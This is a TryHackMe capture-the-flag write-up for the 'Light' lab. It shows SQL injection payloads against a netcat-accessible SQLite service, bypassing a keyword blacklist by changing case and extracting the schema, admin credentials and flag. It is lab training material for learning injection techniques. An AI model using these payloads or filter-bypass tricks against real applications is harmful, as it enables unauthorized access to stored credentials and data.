---
title: Light - TryHackMe
date: 2025-01-19  
---

# Light

## Challenge Information

> *I am working on a database application called Light! Would you like to try it out? If so, the application is running
on `port 1337`. You can connect to it using `nc 10.10.226.23 1337`. You can use the username `smokey` to get started.*

## Challenge Overview

This challenge presents a database application accessible via a Netcat connection. After connecting to
`nc 10.10.226.23 1337`, we are prompted to enter a username. Using the provided username `smokey`, we successfully
authenticate with the following credentials:

```bash
> nc 10.10.226.23 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

The objective is to extract the `admin` username, its password, and the flag.

## Enumeration

### Initial Observations

Upon logging in, the application accepts SQL-like queries to interact with the database. However, we quickly discover
that key SQL keywords such as `UNION`, `SELECT`, `union`, and `select` are blacklisted, as shown below:

```sql
' UNION SELECT name FROM sqlite_master WHERE type='table
```

```bash
Ahh there is a word in there I don't like :(
```

This limitation requires us to craft payloads with alternate casing or spacing to bypass the blacklist.

### Bypassing the Blacklist

We successfully bypass the blacklist by altering the case or spacing of the blocked keywords:

```sql
' Union Select name FROM sqlite_master WHERE type='table
```

This payload reveals the presence of a table:

```bash
admintable
```

### Extracting Table Schema

Next, we query the `sqlite_master` table to retrieve the SQL definition of the `admintable`:

```sql
' Union Select sql FROM sqlite_master WHERE name='admintable
```

Output:

```sql
CREATE TABLE admintable
(
    id       INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER -- The password field is incorrectly labeled as an integer but contains string data. For example, the password for the user `smokey` is 'vYQ5ngPpw8AdUmL'.
)
```

### Extracting the Admin Credentials

#### Admin Username

To retrieve the admin username, we use the following payload:

```sql
' Union Select username FROM admintable WHERE username LIKE '%
```

Output:

```bash
TryHackMeAdmin
```

#### Admin Password

To obtain the admin password, we query the `admintable` with a specific condition:

```sql
' Union Select password FROM admintable WHERE username='TryHackMeAdmin
```

Output:

```bash
[REDACTED]
```

## Retrieving the Flag

Finally, we extract the flag using a query that avoids the admin-specific condition:

```sql
' Union Select password FROM admintable WHERE username != 'TryHackMeAdmin
```

Output:

```bash
[REDACTED]
```

## Reference

- [The Schema Table](https://www.sqlite.org/schematab.html)